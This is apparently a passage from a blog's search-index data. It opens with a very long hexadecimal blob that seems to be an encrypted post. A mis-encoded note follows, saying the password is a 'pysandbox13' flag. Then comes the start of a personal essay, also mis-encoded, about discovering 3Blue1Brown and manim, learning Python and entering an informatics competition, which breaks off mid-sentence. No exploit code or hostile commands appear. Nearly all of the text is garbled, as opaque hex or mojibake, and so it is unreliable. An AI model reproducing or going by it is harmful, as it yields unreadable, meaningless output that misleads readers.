ddb885f89e8e129a9c09b122392e3635d9774efb7eb46b61f731411fd9130abf82b0a7c6ab77204f4f91bd5e6cb0ee3811e1a8b717606b6ab63fd29076d1987c9ef082a2103d009303e54253f5100f07e87787ca0c7ac4f76ea2f636d8b1dee8a150a0bcf228ba703e79187d19ab2d608d73903c1f7eacead6399de9e7250356756781d50b426672ecdbe558e4e46c749080e86cb92f0345fbac2ef287bdd3538e1cd498ff7a0e03dea46c730d60496210f7a3063eed64a4f71c8c715da8af59f916790580d4cf2acd92252a187c905cf4372fd886bf8aa9ff30afd37a955bb77532fd32ea9b95670b08d06afdb30aeed5e32d4170c9f806d8029813c87da6a93c0d93078ed212b8dfa824e23d0a8df253bae0117a8b3224f4118a68e0267a0474813e4eb75f7c400716a01f983d3079c50d66b59f2154ee8b72ba690c89e89793de9cde3271420099ef22862795f0434b48aac25cd679fda430f1ed676398ae134c1b5408f25641a593b0d25465c6fb49daff868ec017f9e69192e3f07730c48928e7dae97be3b3bb4da54d2f2136bb53a9d4f96ced4ba95353c007fe2e40257fbdd772d28916c231cd0e8b6ef1b9997add97d410fc9428c70c1b62e7f1c899cd70dadc49b9680cceb2d497fb2f63d5075aea81c6859e049950c6f82318659e6ea46c06fa1410fb73031a767d87296dfd2e6105c80ff8b1ba53b019525f4040e7624646014421c33e21351fc37ce671d2ec668207aac5a7959f4b91c3ae36c95eec9ba325c370f76f1f3db67754ff79656e3380c508d7737d8ee5b70fb56f5ac2089834d169c6695f73b1896ea2d946ceeb4fb2c0a2545f09355b6724fbc56fdbfce3e5735c041c36ac8b848d541f49d6a4b1f0d7bf730cd3309a2800f26946f87f678645de8d0248d63840d098fb81b819b67614d0184de681832850757739232c9bdb8e1a27f83ce1d011cf33ad989c201d53b593c0d8cbc7fedb685110c62dd0037c1834942b81d5341fd94c55e6eab21c6c1035d44ab72ca8bf5230e71d26bf24cb5a20815be69484a839a04df9b8c1bc11d968929cbea6906a81f280d6128cda31197450f2a084f1cfe253b215c7e686ae66a3f966c82ee9c81d975dc7f296077772c7ce422479174b73bbf5ae378c29d16a7db727edc83c19453425659a74d852befb15482b3c783beddd05650d59314309750077137854e1c544563b1783835d33524c265eb027b49a953594ba3b65a5e685e689e815e1bb7fe681ae79d3d496fdd8d00c52abca6048d42eb45f551f56061781c84104b706ef66c7b166424559c867b706516a7576aeb3b822dbed48d89ed5ec269c28d6749e1daf15b9446b3485790df119a7fa2d87371a6ac9b1c8e6ec20f1b06e47641175ce0fa18a589f53e0e12a5f9ae61bab1928d208f6e6ca99cf9a1174375d3c254490f1b41264865feaa2990b26e7687cc1b649a28200583898300a7421da42be6730309b6a61d19337333858fc7bf7fbdc8385ec8cc709308a88a01703c28f37e4848f2c8855c11c959b32ce349858932708a23a78bd34f0af98909e9d4f76aafca44cfddda434c85c962281bdc8d6caba8a437c13d13dffaa647d131799f8443dc13081e483da02dfef9f3207320b74cf07eaba17d466c68797d0692e1077c562242df55044b00a3743973d6d27f35f463f849fbfe98f41836b58d24a40b07aa082538b8f6a788042c2b7828cb5b37359a8272e17731f78c884bf199ad977c58137fd64bf0aaf9154ea69ee3cb2a440ea27fe84ddf2969010a4d69399fc4fa9cb1315673b5b038ea828b196ba7041664053c502bd75565e5197192749b4c84eeb12bd01c4a591393c26ef7dc8cd70773e9cfed4f1e14b136350fe41b6e3da9b5ba06397fe08a9dc48018916158faffd4626271fcab61498031f6dfed3a26dee7741134c8f7ce01af895654e5a6884b0a600a30aaed6974c40b5560f1af4875f5c243d863a23a0a62574ea86f2a880b0f7750b158baeb6e009e7f9a71c1f32384f333dbb9826aa5900b64c8255dfed71bb0b883c6b9129d8b50d489166d31ed4196e1f47f7adf0114eef2a154a2335a474d99250f58f39eb66140098ab6f7118d9eeeeed24f06c0932c3210f9bcf4c9098450f9c32c80a238a933e8651428fdaf5c3622ace27083b8862f92cf4abadc38aa7c5f1406e78189b67ce02d2263f1c5ade65e75dffd26efd3edf453247e5e1ca2aa044c0471e813e32abfe626fd43c4eb4d4bad6045e64e25fa70059c6e2e7f0aae6d64aa48102c888249e7185efc11409ad5d2ed5173b3282416e56fae1176f75989e096ab33d4702d8c9bfda089882594dd0a31eab10515ff2bb2d93c0ae3276728c2d389cd0529451eabc4ba0cd8c05ea9583be9280026274c9e3ef34b12f7c09dc4690633faacec67a4292b366e090f7d3e214f284f6475755839ced63066b74bcaad9da47ea9c699c2cca3702d276b4b886798dced0b43b4009b09a170e53e6ea694a49301fd3b75f430afe74005433238b7b84a0225b5e7d566fdc9ddea930a9248509c2542360ba5f9f30d93b2ea4956bebc56c932dceaeb3c02f876a899186d1b2a398712a560b608290985e9c667298172179326b37334d519f0abc83654306269154fec14bd53f06f50695e69b95305730a8ecbc58dbd3116ed6b1dbf94b84bd8f3fe85768f62d060f0ac916d67130f723c7fe7b248a749faaf74e44c37e197cf8119cb9c2713a2560286c68a57663c72b83baba4894c0cda05e88099e2acaff10db01d5b20a07980a0756ddbfa4de8e64d79f75c767163f3c1c24c95d8a3c033fe800658c3689f8775808db6c259e7e8636c226d2b482225740a1f85e1cc5196c78c7cb90576905d3d4396dfb8d4babcc0ec4c294b9c76fb8c6580a19878d376fa06329786f2999a95dbfe3c08619f5127edb642f04114e082c3bf2451d1608949637cd9fad4817b9a1426717fbe1048fba5abbf5755ddd2547c6246a5ec609446440f0bafbbe190e9a1ec4569d76ee9a8bd9e398f0e75d4e7d911c768bfec5dc85d58c8160c6ad99dd99d48771179b70c69d8117be09877e5b8ceade62800f037d449950a276265b1a459cd876485de15d6db9ac31929b75f64169a4483c22edffadb353e11757a13d5dd58241b04821fe2022b64d3cae91d38c6ff63b10343355cedf2113a0d045341cb1fdd62ee90b4d037c00d1dda3da71200a45d4042897963f78645e73f7205b6c59844c9b94f1206aea4b173478eb7eac2d697dd596ffd484f7f9615680725f9256d32ad8f517b8a5a38bf1ca0c752521055a20f5e43e36c37cc79d20ef62b4ba3bccac2b45512253bdb1a4423ce3c499750d732356c6d436bee3f637bc120b5f9894a6133dd04536984dd35f7e67f5f402a2adb7cb21874b234a19d9507189e4cd48f16b6d864a132308bf1c8fffebdbff193272db81be4dd7e11599283c958ce4c05c5c6a9677f24eb7b729494ec704045be3da113058b14778c6d8cec8cb3d54581eabe5102066ab85d9ba4e5f044f98060e46d8916004cf8f736915a7d3548bafbd20e3345ea00a2741e8f0959c8417fccc0cfa4ef1dffaf9c52e30230ab692b5db83883d503829274da4e66049452923b42a266fb7868e058488386bab00824d2051757bb74451a06b5ada870bc31248b81158fb79c733c4924904ed42f0b91ae7535a118eac68bfd4bc5ab1300b390e4b9741dea94be7d7ea4c77ad0de231717bf00fa493fbf42eb48398b63aa716fb626684f03ad6a118d70a2b6a5ce65fd90f50db5f390252ae7b2645f3e343d4e31891d1a74e72d32007ec40aa8f788796c4126ee7e9a4c7cd9918d707383a8dadff8f819dfd15a84bbf91af4af8f30d10072d9c9324f6b48c8a0228942c45f182b1163e040587086501eba7f91f92c76545d1665da5394c6f3619715ce2c2fa575fbf79ad2f32f99aac711e460cc152147cd07ac18b7e6a8a2491359c122e47f1991bd3aeacf7b78a1024b466c494e48b01fd2bc9f108fb3646582a6a684578a685766b8b6963a9735f0e522e0aee71f40adcad080707be2c0a5cde361bf13be997a660c4d8f9381a8d2f801a53b209365531f9312856a73f2d4af1d9453ee0a9e1284f8de0c64ebdfff1bb31b02e7491c281b2131299f5b9bd681b429dc108f3cb712c6024edb290f7feec54c19744549ea0f705ffb46489938a2dc2257560bd0fdadd14f2ff933bb7f9091303f814eb91d1d92efc3bd5ffd56c4fff3e189b90f7ab13a43bb13d4bc57baad51964ca7078654dbe3b2ed487fe68c97687fce1cb775926749116d0a15d9ee679937a460596c903d92fcd68ba673888b106465582ac0f1ac34ff75b984ddb069cca66e340466fe12a5c8304aaa664e83e0750367de45f5799f8108384d6b2214752ad945b57e5c6216cd99ab8ff8ad6143d620c71363bce48f6077f1341420900f2aab6fa7114ee99fd1e14cf83a1151378edc73f40749c27897a4a3718cfecc6dc362c40cde10053b2cf0f4a6eb5d696276a64061474c99003b254beafe19e49155380d1c1b003474d6c6b424a2402898479b08876229218e9c6c906847351cadc1764815c66b4fbdb9b5747e4b06b6934bfd36ba7b27672d0e47321ca6943430fb5b5e99c830dd807d88704722a3047092615a36073068d17058f0163bebdfda676d64d1588413435a80e61c6b0c96580b8e659e6ccb083e90cd1f9925f1097d65c07ac54a3943197735207c87d11ddbdfc366dfd69e4ebc6e90d015f2fe9fd3cfef644153e41d7a1e8c852621886db50c998da4c32c4d5fce06483c7cdf2fc782bf5ecd3642ccbeb6df0c7260d44993572d743d9ff67087439fe40ec2c06f2f0071dba3c0150b222ce053bc124d489dd0e4b4224509f3bf45bcac2c9bfbefafb1170ef63fc78a8fd7195ab3fd5b01cd78939bcb5645f1fd0cc9c2c0132e21f6f6eb03cbc807d08076a17e252024bf67168cc684af4c1e7525c15ba1bad230cf932f0d69efe2ff1d55aed7e8e09e6d25130741fe793014cbcb07b19edb13c875cd56a747dd54efbb0744bacf8df20ca5452d661aff7a48aff2521ad62bcf8976d04038bb329539b7823d99279140f54d141c5647f5bb7a708da61074b36d7d854345981a9c7fd67f6c8e093747a4392ddf94faef23d50686e21f24a9817c1fae3e4cbde2cc04535e41415bb16b8cfc5d1d796a253641abc83dfe232dcbada81a22ec3920d4b8cfebd3c54861dd99d24f46259ab3077e4abf2a53e16b484bc4686e8548277b02f7e05f2607a2cedc7155e9f6c2e1d542a5195e119c9a13720d5ceca8ce92ebd88e63436292676078eaec9621c57ed38e1be3b1ac08dfb12bbbb868b06380db8cf5a0a2dded1d3d90d3219174189334fca504a7db642076c868db5a57a2e3089b2ce127fb3a626ab751e65bffe8e06a36b1792cc5ce768f49a063eaa6eecd5206220a44571767b6785d7c0a7065584248df23b9d8302f0038c71d1d776c55aae4d02df30bc10a31ed018a29bac8bde7493bf6b49debf8d02e52299e951f52de75a32c161ead7113df27154dc62f9a3cd1a4e8deddc344d6ebd1b6a18f34ae38e5db1d891d88b7f259b0811b01abc13be80778df1f1c97b25924ed54a1066e28001bdd81102726e332fb14071d79b4e36ddb3fdf11cde7a383a2b4ea3dae77c0df25a9dc16d397d938ed6249f6d39797f252e6c011eaf2d8fcaa6fe487f19381e1c92cef0a48602a5abbd68ab0876fafab02e929bac1e2c1afbf89879eef7a72653191221a06b64371737a02726548b0c9fc1fcd687f6a09f7fd5916d05e7dffdc9f03245eda55eafdd253ed474a5640c37e7ba0b032e20e3e1cb7989329d0c771e0531a7a8d8dc4554995135c328926c8fe1704e27b9d154cc6b912b98a0296dd9eb021627a5cfdeb998aa65a6fc145a72a0e099cf76afbf3a8d856a40cb6a0b6cae2fa1340e6de441f4e166e10250d486369cace07670c005f1221e42c41796c3b04b2ae7c2872415d5a0ad31a318808c85a704c5187c5f503fdf3a030bbc3d5d39148212ffd27f1da34757a2d92bc310ead7f826fc19d140ca477adb389ae1ca38d891571ca442bdea9afe56a9f187b9c2480cdb0c0ae6a38ff4c92f2b3e4e20f6bcb2bb66e288160890dd9bd732b50d5feab52d973b3eb78adf29c8787a137537d70fd28f08b041989eb880b650167e182f95e918acd1834f408e9460387c5daea4804b831dcd8626a31f0051930ce2911c6df7b09dbc2d770749c285f7d01c5b0a85053f416620330ba658e9629b9e109d6ee3ad4079f49118c11fac9624f8dafaf526e70349d3a17dbb44d27a784a3c451f8f81d5d750ead8bacbdb804d6b28f244781b3cf58ae3ab345d8a9b06b0cfd0f39f8d475eb9de8d9b638c20416e877fc3576af431bef6e4c801b1e56ed44c33650e91587c01594da583589fc59d31c5651eddc2b94be4571ca02fb27a1bad74d2a459cffd7aba53487c9bbff5bb497c9ea55cb947d3ad54bd7d08a3efaf05d225373a611e2c072ceba37a14b33eb1ae22d54d4f3eb66280d8199cd3a5e2db41f38004231bd475a9e1e971515a8bff1834f8d3f5c8f287e0e8a239fcdba588ce62f4f6494108ea01bc403b57ac012e6f5c9734c69ad23ce3cd404a377412275a6f695f3cd95ec3bb714a54e1cbc603000a869a492ba6ee7a64b96f28c6229138aa2c8e7ea6b218473ef07c2922f0b2c2b5f287dc8fcfbf7149fd24bbf8a97f88d8e95d91f694b4fc92464279ec678cddc7c05e67ab4954237f138f43264fd9de7cd767e23e2e4aa7c408df1c375cd49e2f085e50b4f834e29115aa234e243ffe6547126a292461436d44bf3d00282f0cb79c55f0319c17c2e510d59072a69c2d75ed273691201af187f419df0a92b92d798d3d1f807dac8cf958c5675b349d6af5bff5bb29743941c12b04c07b86eac804e6b41e3f17c1010e4375424a8d8a0b5b7a0a45ce76cdfdf38c2f261e80485b54dac5371ae5b24d933bd0b96830e67bfd62f972299690b2636318ee20264fce5b37f72181a8410c0b212fbd9b519cb538276d7f28adbb6e73b5dd6c3262fd86cdd39b9bdc861831cb99494b6513354176f011787951efec9b0906222419ed3579180de12ddb3889f9130673dad898fada6700796654bbd77af1d30f5cf1e1dd10736bcbc3001998c7f7c02b1db7892ca7a220716cc01110c4795f01856763090c1440f9ca2cf4a506f804662635b71395e3d14202fc9331c3dffa5767be63628be6e15e307cc814e416dffd616bad81e1055294bbdefb79a8b9387897c512881554a28c6aa8d7576de3b3a86b91e9816ca570f4aaa123fec6b10de324c1a780847d13ceba60f4bf2547b3794f19085e8ee7696088fa4bad5eb6ddb9220281b22f25f2a6011a17d861dfa54ae10c42acf73d2042a36f42ef05e83c072bd0153f83c523f7d9926a9af303146cd10663d6746919f9e3c83db21521b964d9bdff57f747a656841d0a623acdb4dfafd2c9bef8728c4b1be450251e6b07c87b6b271b6fa9cd4e94187023f820151884f80d4d1241e25425f3b45fde1b72600f3232b544dd1c81a5dc5db124be9c00cf2f0cd21628c57d329822e667288151fdf847adf7895117bd7069b77b8949231391fa48f18e43aa93ca8c24a7d8bbe4382a0998e7394a97359b0345a239be2f9670629f04c2b88a055b1b9e0d941b40fba7f9b82ac0e2a8c5076f75460a7d00d8702d80057c9e9aaaf4f20750b806b5d5fb37ed46c9a3326eaf80b7d31d19544313ce2c43b3af7b870ecbee7ecbf5a3e45f6edf8fc721f1179074a319d186dcc05ad7e799c14e78ae5375e3c51c8d254fedab095baecf33833f152e88e7e7009fa7832c611b12d1dd01e40658b86fdc071af4b8c9b458f8aa246b42f266cd554f3714276bc45f936a8c7b2913a2a16913a3e9b32cfaf9e3cceb1fc5b6c538baefb81bb97c0a2cf52f8696ed5cdf55c24426d4e3dfa03ddb8827883d02e17b177b8b13c0e7e7f47932d3eb62b96124cb51b293ce02fe2ed562e2c66e6a92a94366daeaa5ac074298cbac3b4439eafbec15a3aa5ea9e9000b6749bacd21ad25cc3bb0fc4eddef4e2931fef59bb4ce9a9fd61efa7c06b6d661dfdb8d971e3608cd1df7bf3babd17d146c130078ba5712028a292feda3cabe806dd61b5385d51ad8e123e39e1bfba013f9555cb55ccb8b89acd70f313b3ad943e082e88234d865f780e3ad2736245d2c913435994a46c9d19deeeef30140199d6da8f0dd949f6f232f0167c0bb00e5136d6e432d1150fdc3007f98961402d7743d59fbc6378c4431b4e2f7fd03e0cc66ad698e450f9dcf221cf6b4e00cd333d4447346fc75828938c1c6ad8fc0d72e82d96ed62e452da08b160e536c3de33243773d62d2dee14f2951e00e4790736830320e1406f3c2c67a84010aebc35d9228178efb64f26e727da91551b4e3540b9b5ec85f511ad98665f24b951070aa831ca476fd7e84b403a6ac3a515cea819e446a735d19f4132a8a05f0ad4d3cc138e26426f49b8d733e40c43af699dcf7ebbc71ccc069abf946ea70f07f47ad919ea5bf2b8bcf9ae6e2de10c9424110ebdaf982a9f05ed61adf5882179b79d6fc2f01b4c198a738bca0fd7f8d456ca759fffa2ecd76e0e8aaeb129fb8686b0ecbafa0587246c49c00f3aa2c26c5703ee822bd146418241ce6033a26db4f5102e116b74c26c2d45ab7adb9a88e8e4d3cdf44857478ad4f07bbd6d140d738706ba5dee58a7cbd9bccbeb91d747d77c7fd72c6bc1e3d37c420b4e72660d5f7b85ad432e6a1b29797df64e3ac22650a6095231d7d7b4d7d91b060afe2fee3775aedc1c8db74ad7798a6d3699982419d50655aa70b228fdc7b012ac491a4f194c95874380b8c4a67cad056ec49b0ec2c4aa453d3bff03c48146f3d196fb1afdd351cbe393f5ebf803e60840014f8aa62c6263a71175ab1f1bc43632e473028a84b207eb039a68715134e5740c54a991011b4057d090fbb899b8dfaed1c8ca73f600e0d55869d8fbd53a906ec948491d3201eac6fc630a3e203898e0300d21a953d74fe68630e3cfbe36745a1bc851ee470fcadea77220f524df022c847bd6ff9e2af25b6e52324f1a5c08a6b527ac0748872bd917c55e32733bde1e37f3b5c1d99c729e0435191d9ce72f8f78c6a17460e86609c73568b48d8814322bddc3f2fdcde1df850368fc02da1884c3365bdfff2dfa94107afa23554c2c4f976b489557b1ac36d3e93778a39b98e83795ff738c22cf53a88dacd494d8a493456d40fa71b92bab373e8739580ae95f8be6f3c7b15c6a5822cc5cf700d645a6e50f9f5ff2eb5f8a26a9adb4402012ce6f7f9eca895bcabc09100ac802faacf750b0689e85d1e71b4dc3ee975f39573e86da72c70164b45a691d765af53768b933b477a12858a4a705d9eb0790079e53dc9173fa0bf47295cd9e99c42310beef0831d987389224700b8444d75935fa9941817c7e5e3959875c32a1f8a789fe1364f93e6b6ad27552e29317e6ba3a4b91f113e2cad851ba7bb9fbae7cce65bbbb91d3f0955b46d5a897dc17fd9b34fb8146e5e89d2f829966f8cb35b15524d22c04c3bcc4e4b8d8730b086f39c1384d2a392b4affe0e0065af927bcfe1320422a402d8ae5fa187dabe80724d2c056818271d43611b6babdb2690cb8df31e7305ea028ade53e1b95d82d023af6aa279d19a18aff92a8c0c982ed18b4807fc14ae51e3f6d7ecd162dc38a6b8cd787abadb1e405a7e42202dc02ab6c61e96af5a98e4ea6874fcb8fe3a85c6ad91224e60e2f792241d757654d960a0e24a85d7f2dc72b5786cb65ec0fd22cf724712f5fb45992501fbe6b9e1b1d62153a8e56fa3d3aabc7b99c3becbb2a7a48a0f8bdc91b11d5b0b02e479a172bf18a68920d5f5fa550b11a6e9541b074f3e3fc2a752d0ddc880a96696b1c1a699c5b622811d63629d604725fc2ea456b3b81d239ab57374d055dfd76dc6199da23d52e9877b734507f0c0959183f30fd47ad728a13ac4bde5a74eb261d2cad5495524b25395929b8122f8965c4ba8e0209ae4ef966278313258388b5d06ee49bb8f29b654bad8d2e8787c74cb099c1fdc018b3059e6fc7524d3ec359e5c01d0d3958798f916bf61e18d5689e3c3b55eba92d5bee49e2aa7043c3a6a5f831744447f7c5b08e1088dc2a09166cb98e56d2538c2c6d9a2c68c607c2a712bf2e55f36706b78afcd336a48e536ac7e8d08e2673e49a619f808dff7ef4c941b9132c6b9798fbf6a2859a251bef23a43966415f131fa4dddec86dc1ab6a641f61c08b199b307bd49379e997b27a272b4d544c06e3a8acbaae12ad6bd94e2b7dddbaf2e21d596fc1f8853a4059688c1baf8a4528bc4223960b0ff415af68b91554b9681b0749e5dd8d7836c27fedaba9bdc33118bcd8228b01ec77ed6a052b340655fdb08a9b9d178620d78aca1cca5c86149fc943c569a7fe8f820a18809006ec19ae0e7b3b2b59215ed1e9029cc0ef8f1cb49638a3d69d02cc3af2f10ab21f50e0da06a87217e6e3253a23b5de581e39f145fd16596cf6c8f75e492042be02c46816a87615c2da64 å¯†ç æ˜¯pysandbox13çš„flag","link":"/p/e8996288.html"},{"title":"ä¸manimä¹‹é—´çš„å¾€äº‹","text":"æœ€è¿‘åˆšåˆ°å¤§å­¦æŠ¥åˆ°å®Œï¼Œæ°å·§æœ‰äº›é—²æš‡æ—¶é—´é—²æ¥æ— äº‹ï¼Œæ¥è®°å½•ä¸€ä¸‹è‡ªå·±ä¸ä¸€æ­¥ä¸€æ­¥æ¨åŠ¨æˆ‘èµ°åˆ°ç°åœ¨çš„manimä¹‹é—´çš„æ•…äº‹ï¼ˆæŒ‡æµæ°´è´¦è¿™ç¯‡è™½ç„¶å«ã€Œä¸manimä¹‹é—´çš„å¾€äº‹ã€ï¼Œä½†æ˜¯é‡Œé¢å¾ˆå¤šéƒ½å’Œmanimæ— å…³ï¼ˆé€ƒ ä¸€åˆ‡çš„èµ·ç‚¹ ç°åœ¨çš„ä¸€åˆ‡è¿˜è¦ä»åˆä¸­å¼€å§‹è¯´èµ·ï¼ˆå› ä¸ºå°å­¦æ—¶æœŸå°±æ˜¯ä¸€ç›´åœ¨ç©ï¼Œå¾ˆå°‘è€ƒè™‘å­¦ä¹ çš„äº‹æƒ…ï¼‰ä¸Šäº†åˆä¸­ï¼Œå…³æ³¨äº†å¾ˆå¤šæ²¡è¥å…»çš„å…¬ä¼—å· â€”â€” åˆä¸­æ•°å­¦ã€åˆä¸­è‹±è¯­ã€åˆä¸­ç‰©ç† ç­‰ç­‰ä¸€æ•´ä¸ªç³»åˆ—å…¶ä¸­æœ‰ä¸€ä¸ªå¾ˆç‰¹åˆ«çš„å…¬ä¼—å·å°±æ˜¯åˆä¸­åŒ–å­¦ï¼Œæ€»æ˜¯ä¼šè½¬è½½ä¸€äº›å¾ˆæœ‰è¶£çš„å®éªŒè§†é¢‘æœ‰ä¸€æ¬¡å®ƒå°±è½¬è½½äº† @çœŸÂ·å‡¤èˆä¹å¤© çš„ç–¯ç‹‚åŒ–å­¦ä¸¤æœŸè§†é¢‘å½“æ—¶çœ‹å¾—æˆ‘å¤§å—éœ‡æ’¼ï¼Œäºæ˜¯å°±é¡ºç€é“¾æ¥çˆ¬åˆ°äº†è´´å§ æ­£å¥½èŒå‡¤å¼€å§‹åˆ¶ä½œDECï¼ˆå®éªŒå®¤çš„é­”æ³•æ—¥å¸¸ï¼‰äº†ï¼Œç„¶åå°±åœ¨è´´å§ä¸Šæ¯ä¸€æœŸéƒ½æ‰¾åˆ°æ¥çœ‹é€æ¸æˆ‘å‘ç°è¿™äº›è§†é¢‘å‘å¸ƒçš„å¹³å°éƒ½æ˜¯ä¸€ä¸ªç²‰è‰²å°ç½‘ç«™â€œé‚£æˆ‘æ—¢ç„¶æ¯æœŸéƒ½ä»è´´å§ç¿»åˆ°å“”å“©å“”å“©æ¥çœ‹è¿™äº›è§†é¢‘ï¼Œé‚£æˆ‘ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨è¿™ä¸ªç½‘ç«™ä¸Šç­‰å¾…æ›´æ–°å‘¢ï¼Ÿâ€å‡­ç€è¿™ä¸ªæƒ³æ³•ï¼Œæˆ‘æ³¨å†Œäº†Bç«™ åˆå…¥Bç«™æ‰€ä»¥çœŸæ­£å¸¦æˆ‘æ¥Bç«™çš„ï¼Œæ˜¯å¤§èŒå‡¤ï¼ˆå½“æ—¶çš„å…¥ç«™è€ƒè¯•è¿˜å¾ˆä¸¥æ ¼ï¼Œé—®é¢˜ä¹Ÿéƒ½å¾ˆæœ‰è¶£ï¼Œæå¤§åœ°å¸å¼•äº†æˆ‘çš„å…´è¶£èµ·æ˜µç§°çš„æ—¶å€™çªç„¶æƒ³åˆ° å‡¤èˆ å’Œæˆ‘åå­—é‡Œçš„ é¹¤ç¿” è¿˜æŒºæ­é…çš„ï¼Œæ‰€ä»¥å°±é¡ºåŠ¿è¡¥å…¨èµ·äº†ä¸ªæ˜µç§°â€œé¹¤ç¿”ä¸‡é‡Œâ€ åˆšå…¥Bç«™ä¹Ÿåªæ˜¯æ¯å‘¨çœ‹çœ‹æ›´æ–°çš„DECç„¶åé€æ¸é€›ç€é€›ç€å°±å‘ç°äº†è¿™é‡Œæ·±è—ç€çš„ä¸€å †ä¸€å †å®è—ï¼Œä¸€ç‚¹ä¸€ç‚¹å…³æ³¨äº†å¾ˆå¤šupä¸» å…¶ä¸­ï¼Œåœ¨æŸä¸ªè¯„è®ºåŒºï¼Œçœ‹åˆ°äº†æœ‰äººæ¨èupä¸» @3Blue1Brownï¼Œå°±å»çœ‹äº†ä¸€çœ‹ç»“æœä¹Ÿæ˜¯å¤§å—éœ‡æ’¼ï¼Œä»–å¯ä»¥å°†ä¸€ä¸ªçŸ¥è¯†è®²å¾—ç›´ç™½æ˜“æ‡‚ã€åˆä¸ç¼ºä¹ä¸¥è°¨æ€§ï¼Œæ›´é‡è¦çš„æ˜¯åŠ¨ç”»ä¹Ÿé¡ºæ»‘èˆ’é€‚å¥½çœ‹ åˆè¯†manimåœ¨çœ‹äº†3b1bçš„è§†é¢‘åï¼Œå°±ä¸€ç›´éå¸¸å¥½å¥‡è¿™æ ·çš„è§†é¢‘æ˜¯æ€ä¹ˆåšçš„åœ¨ç–‘é—®äº†å¾ˆä¹…ä¹‹åï¼ˆå·²ç»åˆ°äº†åˆä¸‰ï¼‰ï¼Œæˆ‘ç»ˆäºçœ‹è§†é¢‘ç®€ä»‹äº†ï¼ˆxå‘ç°è¿™æ˜¯ä½¿ç”¨ä¸€ä¸ªå«åšmanimçš„ä¸œè¥¿åˆ¶ä½œçš„ç™¾åº¦ä¸€æœç´¢ï¼Œç»“æœæœåˆ°äº† @Solara570 çš„ä¸“æ  ä¸€çœ‹å‘ç°ï¼Œç«Ÿç„¶æ˜¯ç¼–å†™ä»£ç åˆ¶ä½œçš„ï¼Œæ„Ÿè§‰å¾ˆç¥å¥‡è€Œä¸”é‡Œé¢çš„ä»£ç çœ‹èµ·æ¥ä¹Ÿå¥½å¥½çœ‹ï¼ˆå…¶å®å°±æ˜¯Consolasç­‰å®½+æ™®é€šé«˜äº®æ‰€ä»¥ä¹Ÿå°±å¾ˆæƒ³å­¦ç€åšä¸€åš æ‰€ä»¥å°±æ‰“ç®—å…ˆè·Ÿç€æ•™ç¨‹è¯•ç€å®‰è£…ä¸€éï¼Œç»“æœæœç„¶å¤„ å¤„ ç¢° å£ å®‰è£…ä»€ä¹ˆéƒ½ä¼šå¡ä½ä¸€ä¸‹ï¼Œç‰¹åˆ«æ˜¯LaTeXï¼Œæ€»æ˜¯å‡ºé—®é¢˜ï¼Œè€Œä¸”å¾ˆéš¾è§£å†³å½“æ—¶æ­£æ˜¯åˆä¸‰ä¸­è€ƒå¤ä¹ ï¼Œè€Œä¸”å®¶é‡Œä¹Ÿé™åˆ¶ç”¨ç”µè„‘ï¼Œæ‰€ä»¥å°±åªå¥½å…ˆæ”¾ä¸‹äº†ä½†å½“æ—¶å°±ç¡®ç«‹äº†æˆ‘çš„ä¸€ä¸ªç›®æ ‡ï¼š â€œæˆ‘è¦å­¦ä¼šä½¿ç”¨manimâ€ è¸ä¸Šç¼–ç¨‹çš„ä¸å½’è·¯å½“æ—¶åœ¨æ•™ç¨‹ä¸­äº†è§£åˆ°ï¼Œè¿™é‡Œé¢çš„ä»£ç æ˜¯pythonè¯­è¨€ï¼Œæ‰€ä»¥å°±å†³å®šè¦å…ˆæ”¾ä¸‹manimå¥½å¥½å­¦ä¸€å­¦pythonï¼ˆæ³¨å…¥æ€¨å¿µï¼šè¿™æ°æ°æ˜¯ä¸å°‘äººåšä¸åˆ°çš„ï¼Œå¾ˆå¤šé›¶åŸºç¡€çš„äººç›²ç›®åªæ˜¯è¦ç”¨manimï¼Œç„¶åå³ä½¿æ²¡æœ‰pythonåŸºç¡€ä¹Ÿè¦ç¡¬ç€å¤´çš®å®‰è£…ï¼Œç»“æœå‡ºç°äº†å„ç§é—®é¢˜ï¼Œè€Œä¸”è¿˜åˆ°å¤„é—®ï¼‰ åœ¨ä¸­è€ƒå®Œçš„æš‘å‡ä¸­ï¼Œæˆ‘ä¹°äº†ä¸€æœ¬ã€ŠPythonç¼–ç¨‹ï¼šä»å…¥é—¨åˆ°å®è·µã€‹ï¼Œåœ¨æçŸ­çš„å‡æœŸï¼ˆå› ä¸ºé«˜ä¸­åˆ›æ–°ç­å¼€å­¦æ—©ï¼‰ä¸­ä¸æƒœæ¨æ‰éƒ¨åˆ†è¡”æ¥è¯¾ç¨‹å®Œæ•´åœ°åˆ·äº†ä¸€éä¹¦ï¼Œç”šè‡³è¿˜åšäº†ä¸€å°æœ¬ç¬”è®°ä¹Ÿå‡­å€Ÿç€éƒ¨åˆ†ç½‘ç»œèµ„æºï¼Œæˆ‘å­¦ä¼šäº†ç®€å•çš„pythonè¯­æ³•ä»¥åŠæœ‰å…³è®¡ç®—æœºçš„å¾ˆå¤šçŸ¥è¯†ï¼Œä¹Ÿè§‰å¾—è¿™äº›ä¸œè¥¿ç¡®å®æŒºæœ‰æ„æ€çš„è¿™æ—¶æˆ‘åˆå°è¯•å®‰è£…äº†ä¸€émanimï¼Œä¸­é€”çš„é”™è¯¯å°‘äº†å¾ˆå¤šï¼Œä½†è¿˜æ˜¯å¡åœ¨äº†å®‰è£…LaTeXä¸Šé«˜ä¸­å·²ç»å¼€å­¦ï¼Œæ‰€ä»¥æˆ‘åˆä¸å¾—ä¸æ”¾ä¸‹äº†manim ä¸Šäº†é«˜ä¸­ï¼Œå› ä¸ºæ˜¯åˆ›æ–°ç­ï¼Œæ‰€ä»¥ä¼šæ¨èé€‰æ‹©ä¸€ä¸¤é—¨ç«èµ›æ¥å­¦ä¹ ï¼Œä¸ºäº†å­¦åˆ°æ›´å¤šçš„è®¡ç®—æœºçŸ¥è¯†ï¼ŒæŠ¥åäº†ä¿¡æ¯ç«èµ›å‘åˆ°äº†æ•™æä¹‹åæˆ‘å°±å¼€å§‹ç–¯ç‹‚çœ‹ï¼Œç”šè‡³è‡ªä¹ æ™šè‡ªä¹ ï¼Œåªè¦æ˜¯æœ‰ç©ºé—²æ—¶é—´äº†å°±æ‹¿å‡ºæ¥çœ‹ï¼Œè¿™æ 